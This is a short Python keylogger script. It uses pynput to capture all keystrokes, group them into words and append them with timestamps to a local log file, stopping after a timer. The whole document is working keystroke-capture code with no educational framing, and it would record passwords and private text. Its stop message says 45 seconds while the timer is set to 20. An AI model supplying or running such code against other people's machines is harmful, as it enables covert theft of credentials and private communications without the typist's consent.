from pynput import keyboard
from datetime import datetime
import threading

# Generate a timestamped log file for each session
log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
word_buffer = []
running = True

def write_to_file(content):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    with open(log_file, "a") as f:
        f.write(f"{timestamp}{content}\n")

def on_press(key):
    global word_buffer, running
    if not running:
        return False

    try:
        if key == keyboard.Key.space:
            word = ''.join(word_buffer)
            write_to_file(word + " ")
            word_buffer = []
        elif key == keyboard.Key.enter:
            word = ''.join(word_buffer)
            write_to_file(word + "\n")
            word_buffer = []
        elif key == keyboard.Key.backspace:
            if word_buffer:
                word_buffer.pop()
        elif hasattr(key, 'char') and key.char is not None:
            word_buffer.append(key.char)
        elif key == keyboard.Key.tab:
            write_to_file("[TAB]")
        elif key == keyboard.Key.esc:
            write_to_file("[ESC] — Listener stopped.")
            running = False
            return False
        else:
            write_to_file(f"[{key.name.upper()}]")
    except AttributeError:
        pass

def stop_keylogger():
    global running
    running = False
    print("Keylogger stopped after 45 seconds.")

# Set up and start the timer
timer = threading.Timer(20, stop_keylogger)
timer.start()

# Start the keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
